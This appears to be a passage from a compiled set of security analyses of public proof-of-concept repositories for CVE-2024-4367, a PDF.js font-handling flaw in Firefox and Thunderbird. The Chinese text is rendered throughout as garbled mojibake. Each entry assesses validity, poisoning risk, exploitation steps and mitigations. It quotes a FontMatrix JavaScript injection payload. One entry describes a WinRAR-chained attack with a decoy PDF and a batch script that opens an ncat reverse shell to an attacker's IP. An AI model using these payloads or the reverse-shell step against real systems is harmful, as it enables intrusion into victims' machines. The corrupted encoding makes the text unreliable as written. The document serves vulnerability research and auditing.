**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**  æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶æä¾›äº†æ¼æ´çš„æ¦‚è¿°ã€åˆ©ç”¨æ–¹æ³•ã€ç¼“è§£æªæ–½å’Œè¯¦ç»†åˆ†æçš„é“¾æ¥ã€‚`poc.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„payloadçš„PDFæ–‡ä»¶ã€‚`app` ç›®å½•åŒ…å«ä¸€ä¸ªç®€å•çš„Node.jsåº”ç”¨ï¼Œç”¨äºæœ¬åœ°æµ‹è¯•ï¼Œå…è®¸ä¸Šä¼ PDFæ–‡ä»¶å¹¶é€šè¿‡`pdfjs-dist`åº“è¿›è¡Œæ¸²æŸ“ã€‚  `public/index.html` åŒ…å«å‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ PDFå¹¶ä½¿ç”¨`pdf.js`è¿›è¡Œæ¸²æŸ“ã€‚  

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**  
*   æŸ¥çœ‹ `poc.pdf` ç¡®è®¤æ˜¯å¦æ¤å…¥åé—¨ï¼Œ`poc.pdf` æ˜¯æ¶æ„çš„PDFï¼Œ åˆ©ç”¨äº†å­—ä½“çš„è§£ææ¼æ´ï¼Œæ‰§è¡ŒJavascriptä»£ç ã€‚ ä½†æ˜¯ä¸å±äºåé—¨ï¼Œåªå±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
*   æŸ¥çœ‹ `server.js` ä¸­é—´ä»¶æ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼Œ`server.js` ä¸­é—´ä»¶å±äºæ­£å¸¸çš„expressä¸Šä¼ pdfå’Œæ‰“å¼€pdfçš„é€»è¾‘ã€‚
*   æŸ¥çœ‹ `public/index.html` ç¡®è®¤æ˜¯å¦è°ƒç”¨æ¶æ„apiï¼Œ `public/index.html`å±äºå‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ pdfï¼Œå¹¶æ¸²æŸ“pdfï¼Œæ²¡æœ‰æ¶æ„apiè°ƒç”¨ã€‚
*   æŸ¥çœ‹ `poc.py` ç¡®è®¤æ˜¯å¦ç”Ÿæˆäº†æ¶æ„PDFï¼Œ`poc.py`å±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
æ€»ä½“åˆ¤æ–­æŠ•æ¯’é£é™©æä½ï¼Œå¯èƒ½å­˜åœ¨çš„é£é™©æ˜¯ä¾èµ–åŒ…çš„ä¾›åº”é“¾æŠ•æ¯’é£é™©,è€ƒè™‘åˆ°node_modulesä½“ç§¯å·¨å¤§ï¼Œäººå·¥å®¡è®¡æˆæœ¬å¤ªé«˜ï¼Œæ‰€ä»¥è®¤ä¸ºå­˜åœ¨ 1% çš„æ½œåœ¨æŠ•æ¯’é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨ `poc.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µï¼ˆä¾‹å¦‚ï¼Œç”µå­é‚®ä»¶ã€ç½‘ç«™é“¾æ¥ï¼‰è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ–‡ä»¶ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„JavaScriptä»£ç ä¼šåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°XSSæ”»å‡»æˆ–æ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€ä¿®æ”¹ç½‘é¡µå†…å®¹ï¼Œç”šè‡³æ§åˆ¶ç”¨æˆ·çš„è®¡ç®—æœºã€‚

**é¡¹ç›®åœ°å€:** [Masamuneee/CVE-2024-4367-Analysis](https://github.com/Masamuneee/CVE-2024-4367-Analysis)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #7

**æ¥æº**: [CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md](../2024/CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md)

## CVE-2024-4367 - Firefox/Thunderbird PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶ï¼Œå¹¶ä¸”PDF.jsé…ç½®ä¸­`isEvalSupported`è®¾ç½®ä¸º`true` (é»˜è®¤å€¼)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¯¥æ¼æ´æ˜¯ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªè‡ªå®šä¹‰å­—ä½“ï¼ˆå¯¹è±¡ 5 0 objï¼‰ï¼Œè¯¥å­—ä½“çš„ `FontMatrix` å±æ€§åŒ…å« JavaScript ä»£ç ï¼š`/FontMatrix [0.1 0 0 0.1 0 (1\); alert\('document.location'\)]`ã€‚å½“å‘ˆç°æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå¦‚æœ PDF.js æ²¡æœ‰æ­£ç¡®æ‰§è¡Œç±»å‹æ£€æŸ¥ï¼Œå°±ä¼šæ‰§è¡Œ `alert('document.location')`ã€‚

**æŠ•æ¯’é£é™©ï¼š**

ç»è¿‡åˆ†æï¼Œæä¾›çš„POCä»£ç ä¸­**æ²¡æœ‰**å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`alert('document.location')` ä»…ä»…æ˜¯ä¸€ä¸ªå¼¹çª—ï¼Œç”¨äºéªŒè¯XSSæ˜¯å¦æ‰§è¡Œ. 

æŠ•æ¯’é£é™©è¯„ä¼°ï¼š0%

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **åˆ›å»ºæ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…ä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒJavaScript ä»£ç åµŒå…¥åœ¨å­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­ã€‚
2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±å¯¼ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefoxã€Firefox ESR æˆ– Thunderbird æ‰“å¼€è¿™ä¸ªæ¶æ„ PDF æ–‡ä»¶ã€‚è¿™å¯ä»¥é€šè¿‡ç½‘ç»œé’“é±¼æ”»å‡»ã€æ¶æ„ç½‘ç«™æˆ–å°† PDF æ–‡ä»¶åµŒå…¥åˆ°ç”µå­é‚®ä»¶ä¸­æ¥å®ç°ã€‚
3.  **JavaScript ä»£ç æ‰§è¡Œï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šå°è¯•è§£æå’Œå‘ˆç° PDF å†…å®¹ã€‚ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­çš„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚å¦‚æœæˆåŠŸ `alert('document.location')` ä¼šè§¦å‘ã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å¯¼è‡´ä»¥ä¸‹åæœï¼š
    *   **è·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼š** æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œçªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ Cookieã€ä¼šè¯ä»¤ç‰Œï¼‰ã€ç¯¡æ”¹ç½‘é¡µå†…å®¹æˆ–é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€‚
    *   **ä¿¡æ¯æ³„éœ²ï¼š** æ”»å‡»è€…å¯ä»¥è®¿é—®ç”¨æˆ·çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæˆ–ç½‘ç»œèµ„æºï¼Œä»è€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   **å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼š** å°† Firefoxã€Firefox ESR å’Œ Thunderbird å‡çº§åˆ°å·²ä¿®å¤æ­¤æ¼æ´çš„ç‰ˆæœ¬ (>= Firefox 126, >= Firefox ESR 115.11, >= Thunderbird 115.11)ã€‚
*   **è°¨æ…æ‰“å¼€ PDF æ–‡ä»¶ï¼š** é¿å…æ‰“å¼€æ¥è‡ªä¸å¯ä¿¡æ¥æºçš„ PDF æ–‡ä»¶ã€‚
*   **é…ç½® PDF.jsï¼š** å¦‚æœä¸éœ€è¦ JavaScript æ”¯æŒï¼Œå¯ä»¥ç¦ç”¨ PDF.js çš„ JavaScript æ‰§è¡ŒåŠŸèƒ½ (å°† `isEvalSupported` è®¾ç½®ä¸º `false`)ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ PDF æ–‡ä»¶å¹¶è¯±å¯¼ç”¨æˆ·æ‰“å¼€æ¥æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è™½ç„¶CVSSè¯„åˆ†ä¸é«˜ï¼Œä½†ç”±äºfirefox,thunderbirdç”¨æˆ·çš„å¹¿æ³›æ€§ï¼Œå…¶é€ æˆçš„å±å®³ä¸å¯å¿½è§†

**é¡¹ç›®åœ°å€:** [MihranGIT/POC_CVE-2024-4367](https://github.com/MihranGIT/POC_CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #8

**æ¥æº**: [CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md](../2024/CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md)

## CVE-2024-4367-Firefox-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œä¿¡æ¯æ³„éœ²ã€‚

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefoxã€Firefox ESRå’ŒThunderbirdä¸­PDF.jsç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ã€‚è¯¥æ¼æ´æºäºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œä¸€ä¸ªç‰¹åˆ¶çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶ä¸­æä¾›äº†åˆ©ç”¨æ­¥éª¤ï¼š
1.  ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„ `poc.pdf` æ–‡ä»¶ã€‚
2.  ä½¿ç”¨ `firefox.py` è„šæœ¬å¯åŠ¨æ˜“å—æ”»å‡»ç‰ˆæœ¬çš„Firefox (ä¾‹å¦‚ 125ç‰ˆ)ï¼Œå¹¶è‡ªåŠ¨æ‰“å¼€ `poc.pdf`ã€‚
3.  éªŒè¯æ˜¯å¦æ‰§è¡Œäº†JavaScriptä»£ç ï¼Œæ˜¯å¦å¼¹å‡ºäº†alertçª—å£ã€‚

`firefox.py` è„šæœ¬å¯ä»¥ä¸‹è½½å¹¶å¯åŠ¨æŒ‡å®šç‰ˆæœ¬çš„Firefox Nightlyç‰ˆæœ¬ï¼Œè¿™æ–¹ä¾¿äº†æ¼æ´çš„éªŒè¯ã€‚è„šæœ¬è¿˜åŒ…å«äº†ä¸‹è½½ç‰¹å®šç‰ˆæœ¬Firefoxçš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

å¯¹æä¾›çš„POCä»£ç è¿›è¡Œäº†åˆ†æï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚é£é™©ä¸»è¦æ¥è‡ªäºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **`firefox.py`è„šæœ¬:**
    *   è¯¥è„šæœ¬ä¼šä»Mozillaçš„å®˜æ–¹FTPæœåŠ¡å™¨ä¸‹è½½Firefox Nightlyç‰ˆæœ¬ã€‚è™½ç„¶è¿™æ˜¯å®˜æ–¹æ¥æºï¼Œä½†æ”»å‡»è€…å¯èƒ½åœ¨æœªæ¥ç¯¡æ”¹è¿™äº›FTPæœåŠ¡å™¨ï¼ˆè™½ç„¶å¯èƒ½æ€§æä½ï¼‰ã€‚æˆ–è€…ï¼Œåœ¨ä¸‹è½½è¿‡ç¨‹ä¸­å‘ç”Ÿä¸­é—´äººæ”»å‡»ï¼Œä»è€Œä¸‹è½½è¢«ç¯¡æ”¹çš„Firefoxç‰ˆæœ¬ã€‚
    *   è¯¥è„šæœ¬åŒ…å« `subprocess.run` å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸‹è½½çš„Firefoxã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è„šæœ¬æ‰§è¡Œçš„å‚æ•°ï¼Œå¯èƒ½ä¼šæ³¨å…¥é¢å¤–çš„å‚æ•°ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
    *   å°½ç®¡è„šæœ¬çš„ç›®çš„ä¼¼ä¹æ˜¯ä¸ºäº†æ–¹ä¾¿åœ°ä¸‹è½½å’Œå¯åŠ¨ç‰¹å®šç‰ˆæœ¬çš„Firefoxï¼Œä½†ç”¨æˆ·ä»ç„¶éœ€è¦ä»”ç»†æ£€æŸ¥è„šæœ¬çš„å†…å®¹ï¼Œç¡®ä¿ä¸‹è½½é“¾æ¥å’Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å®‰å…¨çš„ã€‚
2.  **`CVE-2024-4367.py`è„šæœ¬ (æœªæä¾›å…·ä½“ä»£ç ):**
    *   è™½ç„¶`README.md`æŒ‡å‘ä¸€ä¸ªå¤–éƒ¨githubåº“ï¼Œä½†å¦‚æœæ­¤åº“è¢«ç¯¡æ”¹ï¼Œæ‰§è¡Œè„šæœ¬`CVE-2024-4367.py`ç”Ÿæˆçš„`poc.pdf`æ–‡ä»¶æœ‰å¯èƒ½åµŒå…¥æ›´æ¶æ„çš„Payload.
3.  **å…è´£å£°æ˜:**
    *   `README.md` ä¸­åŒ…å«å…è´£å£°æ˜ï¼Œè¿™è¡¨æ˜ä½œè€…æ„è¯†åˆ°æ½œåœ¨çš„é£é™©ï¼Œå¹¶è¯•å›¾æ’‡æ¸…è´£ä»»ã€‚ä½†è¿™å¹¶ä¸èƒ½å®Œå…¨æ¶ˆé™¤é£é™©ï¼Œç”¨æˆ·ä»ç„¶éœ€è¦è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨POCä»£ç çš„åæœã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥ä»“åº“çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œè€Œä¸æ˜¯ä¸ºäº†è¿›è¡Œæ¶æ„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨è¿™äº›ä»£ç æ—¶ä»ç„¶éœ€è¦ä¿æŒè­¦æƒ•ï¼Œä»”ç»†å®¡æŸ¥ä»£ç å†…å®¹ï¼Œç¡®ä¿äº†è§£æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´è§¦å‘:** æ”»å‡»è€…éœ€è¦åˆ¶ä½œåŒ…å«ç‰¹å®šæ ¼å¼çš„æ¶æ„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±ã€‚
2.  **JavaScriptæ‰§è¡Œ:** å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šå°è¯•è§£ææ¶æ„å­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´ä»»æ„JavaScriptä»£ç åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  **æ”»å‡»ç›®æ ‡:** æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç æ¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ cookiesï¼‰ã€æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€æˆ–è€…è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

**æ€»ç»“ï¼š**
è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”±äºFirefoxé»˜è®¤ä½¿ç”¨PDF.jsæ‰“å¼€PDFæ–‡ä»¶ï¼Œå› æ­¤è¯¥æ¼æ´å…·æœ‰è¾ƒé«˜çš„å½±å“èŒƒå›´ã€‚æä¾›çš„POCä»£ç å¯ä»¥å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜éªŒè¯å’Œç†è§£è¯¥æ¼æ´ï¼Œä½†ä¹Ÿéœ€è¦æ³¨æ„æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [PenguinCabinet/CVE-2024-4367-hands-on](https://github.com/PenguinCabinet/CVE-2024-4367-hands-on)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #9

**æ¥æº**: [CVE-2024-4367-Scivous_CVE-2024-4367-npm.md](../2024/CVE-2024-4367-Scivous_CVE-2024-4367-npm.md)

## CVE-2024-4367-PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ¼æ´æºäºPDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨è¯¥æ¼æ´åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ¼æ´å½±å“Firefox, Firefox ESR, Thunderbirdã€‚ æ ¹æ®æœç´¢ç»“æœï¼ŒGitHubä¸Šå­˜åœ¨åˆ©ç”¨æ­¤æ¼æ´çš„POCä»£ç ã€‚ æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md)æ¯”è¾ƒç®€å•ï¼Œä»…ä»…æè¿°äº†CVE-2024-4367çš„å¤ç°ï¼Œä»è¯¥æ–‡ä»¶æ¥çœ‹ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ã€‚ä½†è€ƒè™‘åˆ°å®é™…çš„æ¼æ´åˆ©ç”¨ä»£ç å¯èƒ½åœ¨å…¶ä»–æ–‡ä»¶ä¸­ï¼Œéœ€è¦è¿›ä¸€æ­¥åˆ†ææ‰èƒ½ç¡®å®šæ˜¯å¦å­˜åœ¨æŠ•æ¯’è¡Œä¸ºã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„PDFæ–‡ä»¶è§¦å‘å­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼Œä»è€Œæ‰§è¡Œæ¶æ„JavaScriptä»£ç ã€‚CVSSè¯„åˆ†æ ¹æ®NVDçš„å˜æ›´è®°å½•ï¼Œä»åŸæ¥çš„CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:Lä¿®æ”¹ä¸ºäº†NIST AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H, è¿™è¡¨æ˜åˆ©ç”¨æ¡ä»¶å˜çš„å®¹æ˜“ï¼Œå±å®³æ€§æ›´é«˜äº†ã€‚å¦å¤–ï¼Œæœ‰è®¨è®ºè¡¨æ˜115.19.0esrä»ç„¶å—æ­¤æ¼æ´å½±å“ï¼Œéœ€è¦è¿›ä¸€æ­¥éªŒè¯ã€‚

**é¡¹ç›®åœ°å€:** [Scivous/CVE-2024-4367-npm](https://github.com/Scivous/CVE-2024-4367-npm)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #10

**æ¥æº**: [CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md](../2024/CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md)

## CVE-2024-4367 & CVE-2023-38831 PDFernet Remotelo

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** PDF.js å­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ & WinRARå‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird, WinRAR

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11, WinRAR <= 6.22

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿéœ€å®‰è£…å—å½±å“ç‰ˆæœ¬çš„Firefox/Thunderbirdå’ŒWinRARï¼Œä¸”ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥POCåˆ©ç”¨äº†CVE-2024-4367 (PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ) å’Œ CVE-2023-38831 (WinRARå‘½ä»¤æ‰§è¡Œ) ä¸¤ä¸ªæ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼:**
1.  **CVE-2024-4367:**  é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡PDF.jsçš„ç±»å‹æ£€æŸ¥ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
2.  **CVE-2023-38831:**  åˆ©ç”¨WinRARå¤„ç†å‹ç¼©åŒ…æ—¶çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ¶æ„raræ–‡ä»¶ä¸­åŒ…å«pdfå’Œbatè„šæœ¬,å½“ç”¨æˆ·å°è¯•æ‰“å¼€è¿™ä¸ªPDFæ–‡æ¡£æ—¶ï¼Œä¼šè§¦å‘WinRARæ¼æ´ï¼Œæ‰§è¡Œæ†ç»‘çš„BATè„šæœ¬ã€‚
3.  **POCä»£ç æµç¨‹:**
    *   ä¸»è„šæœ¬`PDFernetRemotelo.py`æç¤ºç”¨æˆ·è¾“å…¥æ”»å‡»è€…IPå’Œç«¯å£ã€‚
    *   åˆ›å»ºè¯±é¥µPDFæ–‡ä»¶ï¼ˆ`ResumendeSueldo.pdf`ï¼‰å’Œä¸€ä¸ªåŒ…å«åå‘shellå‘½ä»¤çš„BATè„šæœ¬ï¼ˆ`script.bat`ï¼‰ï¼Œè„šæœ¬å†…å®¹ä¸º`ncat {ip} {port} -e cmd.exe`ã€‚
    *   ä½¿ç”¨`PDFernet.py`è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„`poc.pdf`æ–‡ä»¶ï¼Œè¯¥JavaScriptä»£ç ç”±ç”¨æˆ·æä¾›çš„payloadç”Ÿæˆï¼Œæ­¤payloadä¼šè¢«åµŒå…¥åˆ°PDFçš„å­—ä½“ä¿¡æ¯ä¸­.
    *   `Remotelo.py`è„šæœ¬åˆ›å»ºä¸€ä¸ªRARå‹ç¼©åŒ…ï¼ˆ`PDFernetRemotelo.rar`ï¼‰ï¼Œå…¶ä¸­åŒ…å«è¯±é¥µPDFæ–‡ä»¶å’ŒBATè„šæœ¬ã€‚
